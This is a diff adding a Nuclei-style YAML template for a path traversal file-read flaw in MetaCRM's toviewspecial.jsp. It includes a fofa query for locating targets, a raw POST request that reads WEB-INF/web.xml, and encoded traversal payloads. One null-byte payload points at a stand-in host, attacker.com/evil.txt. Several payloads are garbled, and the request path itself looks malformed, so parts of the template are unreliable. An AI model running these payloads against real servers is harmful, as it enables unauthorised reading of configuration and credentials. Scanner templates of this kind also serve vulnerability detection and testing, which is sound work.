@@ -1,0 +1,31 @@
+id: metacrm-toviewspecial-file-read
+
+info:
+  name: 美特MetaCRM客户关系管理系统toviewspecial.jsp文件路径遍历与非预期内容暴露漏洞
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="/common/scripts/basic.js"
+          id=%2e%2e%2f..%2e%2e%2f..%5c..%2500ASP.NET/providers/%7d%3e&username=test
+
+      id=../../../../../../out/jsp/servelists.jsp%2500HTTP://attacker.com/evil.txt HTTP/1.1
+
+    通过构造恶意路径参数，攻击者可利用目标系统toviewspecial.jsp组件中的路径遍历缺陷，突破预期文件访问边界。该漏洞允许远程攻击者读取服务器文件系统中非预期暴露的敏感资源，包括但不限于配置文件、日志文件及WebShell存储路径。攻击载荷通过特殊编码的URL参数传递，成功利用可导致系统文件泄露，进而可能引发权限提升或横向渗透攻击。
+  tags: 美特MetaCRM
+
+http:
+- raw:
+  - |
+    POST /MeitCRM/toviewspecial.jsp?id=.../WEB-INF/web.xml HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: application/x-www-form-urlencoded
+
+    id=%2e%2e%2fWEB-INF%2fweb.xml&username=test
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'version'
